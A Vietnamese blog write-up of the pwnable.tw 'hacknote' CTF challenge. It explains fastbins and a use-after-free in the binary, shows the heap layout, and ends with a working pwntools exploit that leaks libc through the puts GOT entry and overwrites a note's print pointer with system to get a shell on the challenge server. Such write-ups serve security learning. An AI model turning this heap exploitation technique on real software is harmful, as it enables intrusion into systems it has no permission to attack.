---
title: '[Pwnable.tw] – Hacknote'
slug: hacknote
type: blog
date: 2021-12-23
summary: '[Pwnable.tw] – [hacknote](https://pwnable.tw/challenge/#5)...'
tags: [security, writeup]
---

## [Pwnable.tw] – [hacknote](https://pwnable.tw/challenge/#5)
Check file và checksec ta thấy được vài điều sau:
```
+ File binary đã bị strip và là file 32 bit
+ Canary được bật và ngăn không có thực thi shellcode trên stack
```
=> Chúng ta có thể dùng IDA phân tích và sử dụng address bên IDA để đặt breakpoint cho gdb khi debug.
Sử dụng IDA xem code C t thấy được có 4 hàm chính tương tự như 4 option khi chạy thử chương trình, tuy nhiên thì tên hàm không được đặt đúng mà có cấu trúc là sub_##### nên chúng ta phải dựa vào flow của từng hàm để nhận biết các hàm.
Đầu tiên là hàm main()
Hàm main sẽ nhận input và chuyển đến các hàm tương ứng
Tiếp theo là hàm addnote()
addnote(): thêm 1 note vào notes_list[] và mỗi khi 1 note mới được tạo sẽ có 2 câu lệnh malloc() được gọi:
```
+ notes_list[i] = malloc(8)
+ notes_list[i].content = malloc(size)
```
hàm tiếp là delnote()
delnote(): xóa 1 note khỏi notes_list[] và mỗi khi xóa 1 note, có 2 câu lệnh free() được gọi:
```
+ free(notes_list[i].content)
+ free(notes_list[i])
```
hàm () or printnode()
printnode(): in nội dung của note.
show(): in nội dung của note ra màn hình.
Về dạng bài như này chúng ta nên tìm hiểu qua fastbin cùng kỹ thuật mà mình được 1 người bạn chỉ cho là Use After Free :3
#### [fastbin](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks)
Có 10 fastbin. Mỗi bin này duy trì một danh sách liên kết duy nhất. Việc thêm và xóa diễn ra từ đầu danh sách này (cách thức LIFO).
Mỗi bin có các khối có cùng kích thước. 10 bin mỗi bin có các khối kích thước: 16, 24, 32, 40, 48, 56, 64, 72, 80 và 88. Các kích thước được đề cập ở đây cũng bao gồm siêu dữ liệu. Để lưu trữ các khối, sẽ có ít hơn 4 byte (trên nền tảng mà con trỏ sử dụng 4 byte). Chỉ trường kích thước và kích thước phổ biến của phân đoạn này sẽ chứa dữ liệu meta cho các phân đoạn được phân bổ. Kích thước của phần tiếp theo tiếp theo sẽ lưu giữ dữ liệu của người dùng.
Fastbin attack là một loại phương pháp khai thác lỗ hổng đề cập đến tất cả các phương pháp khai thác lỗ hổng dựa trên cơ chế fastbin. tiền đề của việc sử dụng như vậy là:
```
+ có những lỗ hổng như tràn đống, use-after-free, v.v. kiểm soát nội dung chunk
+ lỗ hổng xảy ra trong chunk loại fastbin
```
Bởi vì fastbin theo cơ chế LIFO nên nhưng chuck mình mới được free() sẽ được cấp phát trước nếu mình gọi hàm malloc() đây là cốt lỗi để mình khai thác lỗi theo hướng use-after-free.
Đặt breakpoint và tạo 2 note 16 byte lần lượt là AAAA và BBBB sau khi mở heap lên chúng ta sẽ thấy được có các chuck như sau:
```
+ chunk 0: notes_list[0]: 0x804b198: 8 byte đầu là header, 4 byte tiếp theo 0x0804862b là địa chỉ của hàm print_note(), 4 byte tiếp theo là địa chỉ của chunk 1 chứa notes_list[0].content. (Lưu ý: địa chỉ của chunk không tính phần header).
+ chunk 1: notes_list[0].content: 0x804b1b0: nội dung notes_list[0]: ‘AAAA’
+ chunk 2: notes_list[1]: 0x804b1c8: tương tự chunk 0.
+ chunk 3: notes_list[1].content: 0x804b1e0: nội dung notes_list[1]: ‘BBBB’
```
Như thế sau khi free() lần lượt list_note[0] sau đó đến list_note[1] thì fastbin sẽ cấp phát phần tiếp theo thì hệ thống sẽ lấy phần list_note[1] để lưu list_note[2] và 0x804b198 để lưu giá trị của list_note[2]. Hãy nhìn hình sau để có thể hiểu rõ hơn.
Như chúng ta thấy thì địa chỉ của hàm print list_note[0] đã bị đè thành CCCC nếu ta gọi hàm show(0) thì chương trình sẽ gọi CCCC. Nếu chúng ta có thể thay thế CCCC thành system thì đã có thể gọi shell trong trường hợp này rồi.
Nhưng trước hết, ta cần leak địa chỉ libc base. Ở đoạn add note 2, ta sẽ add 1 note kích thước 8 bytes nội dung là: (print_note address) + (puts_address).
Khi gọi printnode(0) thì chương trình sẽ in địa chỉ hàm puts cho ta và ta đã leak được libc. :D Ngon lành liền
```
from pwn import *
    libc = ELF('./libc_32.so.6')
    #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    elf = ELF('./hacknote')
    def addnote(size,Content):
        io.sendlineafter('Your choice :','1')
        io.sendlineafter('Note size :',str(size))
        io.sendafter('Content :',Content)
    def delnote(idx):
        io.sendlineafter('Your choice :','2')
        io.sendlineafter('Index :',str(idx))
    def show(idx):
        io.sendlineafter('Your choice :','3')
        io.sendlineafter('Index :',str(idx))
    def exploit():
        addnote(0x30,"A"*0x30)#0
        addnote(0x30,"B"*0x30)#1
        delnote(0)  #fastbinsY[0]->chunk0
        delnote(1)  #fastbinsY[0]->chunk1->chunk0
        addnote(0x8,p32(0x804862b)+p32(elf.got['puts']))#2
        show(0)
        puts =  u32(io.recv(4))
        print("Puts: "+ hex(puts))
        libc_base = puts - libc.symbols['puts']
        print("Libc base: "+hex(libc_base))
        system = libc_base + libc.symbols['system']
        print("System: "+hex(system))
        delnote(2) #fastbinsY[0]->chunk1->chunk0
        addnote(0x8,p32(system)+b";sh;")#3
        show(0)
        io.interactive()
    #io = process('./hacknote')
    io = remote('chall.pwnable.tw',10102)
    context.log_level = "debug"
    exploit()
```